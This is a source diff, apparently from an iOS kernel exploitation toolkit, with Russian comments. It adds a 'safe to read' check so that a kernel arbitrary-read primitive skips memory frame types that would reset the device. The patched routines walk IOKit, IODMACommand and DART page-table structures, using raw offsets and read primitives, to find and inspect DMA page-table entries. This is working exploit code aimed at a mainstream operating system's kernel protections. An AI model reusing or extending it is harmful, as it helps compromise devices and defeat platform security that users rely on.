@@ -48,6 +48,15 @@ static BOOL kpLooksLikeKernelPointer(uint64_t v)
     return (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL;
 }
 
+// 1.9.177: безопасный ли VA для дерефа — walker (уже frame-gated внутри) дал
+// PA, и финальный PA не deadly frame-типа (0x13/0x14/0x17/0x37). Иначе чтение
+// = SPTM/EL2 ресет без паники (ресеты #2-4).
+static BOOL kpSafeToRead(uint64_t va)
+{
+    uint64_t pa = kvtophys(va);
+    return pa && !kpFrameDeadly(pa);
+}
+
 static void kpNote(NSMutableString *report, NSString *line)
 {
     [[KPLog shared] append:line];
@@ -1494,6 +1503,7 @@ static BOOL kpPAIsManaged(uint64_t pa)
         return 0;
     }
     gFrameTableVA = va;
+    kpSetFrameTableVA(va);   // 1.9.177: frame-type гейт для walker'а (translation.c)
     return va;
 }
 
@@ -6673,7 +6683,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 if (!kpLooksLikeKernelPointer(host) || !surfVA) continue;
                 for (uint32_t o = 0; o + 8 <= hlims[src] && !entryVA; o += 8) {
                     uint64_t P = kp_untag_ptr(early_kread64(host + o));
-                    if (!kpLooksLikeKernelPointer(P) || !kvtophys(P)) continue;
+                    if (!kpLooksLikeKernelPointer(P) || !kpSafeToRead(P)) continue;
                     if ((uint32_t)(P & 0x3fff) + 0x798 > 0x4000) continue;
                     if (kp_untag_ptr(early_kread64(P + 0x48)) == ucVA ||
                         kp_untag_ptr(early_kread64(P + 0x788)) == surfVA) {
@@ -6686,7 +6696,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     if ((uint32_t)(P & 0x3fff) + 0x100 > 0x4000) continue;
                     for (uint32_t o2 = 0; o2 + 8 <= 0x100; o2 += 8) {
                         uint64_t E = kp_untag_ptr(early_kread64(P + o2));
-                        if (!kpLooksLikeKernelPointer(E) || !kvtophys(E)) continue;
+                        if (!kpLooksLikeKernelPointer(E) || !kpSafeToRead(E)) continue;
                         if ((uint32_t)(E & 0x3fff) + 0x798 > 0x4000) continue;
                         if (kp_untag_ptr(early_kread64(E + 0x48)) != ucVA &&
                             kp_untag_ptr(early_kread64(E + 0x788)) != surfVA) continue;
@@ -6704,7 +6714,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             // cmd: dst = ep+0x790 (р.41); запасной src = ep+0x4d0 — vt-проверка обоих
             for (uint32_t mo = 0x790; ; mo = 0x4d0) {
                 uint64_t cand = kp_untag_ptr(early_kread64(entryVA + mo));
-                if (kpLooksLikeKernelPointer(cand) && kvtophys(cand)) {
+                if (kpLooksLikeKernelPointer(cand) && kpSafeToRead(cand)) {
                     uint64_t cvt = kp_untag_ptr(early_kread64(cand));
                     uint64_t cFile = cvt ? cvt - kslide2 : 0;
                     kpNote(r, [NSString stringWithFormat:@"  [P2] cmd=[ep+%#x]=%#llx vt(file)=%#llx%@",
@@ -6717,7 +6727,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         }
         if (cmdVA) {
             uint64_t mapObj = kp_untag_ptr(early_kread64(cmdVA + 0x70));
-            if (kpLooksLikeKernelPointer(mapObj) && kvtophys(mapObj)) {
+            if (kpLooksLikeKernelPointer(mapObj) && kpSafeToRead(mapObj)) {
                 dva = early_kread64(mapObj + 0xa0);
                 dvaLen = early_kread64(mapObj + 0xa8);
                 kpNote(r, [NSString stringWithFormat:@"  [P2] IODMACommand=%#llx mapObj=%#llx DVA=%#llx len=%#llx",
@@ -6738,7 +6748,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint64_t tableRoot = 0;
             for (uint32_t i = 0; i < 16 && !tableRoot; i++) {
                 uint64_t ts = kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8));
-                if (!kpLooksLikeKernelPointer(ts) || !kvtophys(ts)) continue;
+                if (!kpLooksLikeKernelPointer(ts) || !kpSafeToRead(ts)) continue;
                 if ((uint32_t)(ts & 0x3fff) + 0x88 > 0x4000) continue;
                 uint64_t lo = early_kread64(ts + 0x20);
                 uint64_t hi = early_kread64(ts + 0x28);
@@ -6748,10 +6758,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                           (unsigned long long)leafS,
                           (lo && hi && dva >= lo && dva < hi) ? @" ← DVA ВНУТРИ ✓" : @""]);
                 if (lo && hi && dva >= lo && dva < hi)
-                    tableRoot = (kpLooksLikeKernelPointer(leafS) && kvtophys(leafS)) ? leafS : ts;
+                    tableRoot = (kpLooksLikeKernelPointer(leafS) && kpSafeToRead(leafS)) ? leafS : ts;
             }
             if (!tableRoot) kpNote(r, [NSString stringWithFormat:@"  [P2] ни один table struct не содержит DVA=%#llx", (unsigned long long)dva]);
-            if (kpLooksLikeKernelPointer(tableRoot) && kvtophys(tableRoot)) {
+            if (kpLooksLikeKernelPointer(tableRoot) && kpSafeToRead(tableRoot)) {
                 uint64_t pageIdx = dva >> 14;
                 uint32_t idxs[4] = { (uint32_t)((pageIdx & 0x3e00000000ULL) >> 33),
                                      (uint32_t)((pageIdx & 0x1ffc00000ULL) >> 22),
@@ -6772,7 +6782,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     }
                     if (!(ent & 1)) { kpNote(r, @"    обрыв: entry невалиден (bit0=0)"); break; }
                     tbl = (ent << 4) & 0x3ffffffc000ULL;
-                    if (!kpLooksLikeKernelPointer(tbl) || !kvtophys(tbl)) { kpNote(r, @"    обрыв: child не резолвится"); break; }
+                    if (!kpLooksLikeKernelPointer(tbl) || !kpSafeToRead(tbl)) { kpNote(r, @"    обрыв: child не резолвится"); break; }
                 }
                 if (pteVA) {
                     if ((origPTE & 0x000003FFFE000000ULL) == (backingPA & 0x000003FFFE000000ULL)) {
@@ -6800,7 +6810,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 BOOL dup = NO;
                 for (int j = 0; j < gn; j++) if (gptrs[j] == p) { dup = YES; break; }
                 if (dup) continue;
-                if (!kvtophys(p)) { gskip++; continue; }
+                if (!kpSafeToRead(p)) { gskip++; continue; }
                 gptrs[gn++] = p;
             }
             kpNote(r, [NSString stringWithFormat:@"  [P2] dartObj: %d указателей (гейт отсеял %d) — скан страниц на PTE (PA-маска)", gn, gskip]);
@@ -6812,7 +6822,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             __block void (^scanTbl)(uint64_t, int);
             scanTbl = ^void(uint64_t tblVA, int depth) {
                 if (pteVA || depth > 3) return;
-                if (!kvtophys(tblVA)) return;
+                if (!kpSafeToRead(tblVA)) return;
                 BOOL seen = NO;
                 for (int v = 0; v < nvis; v++) if (visited[v] == tblVA) { seen = YES; break; }
                 if (seen) return;
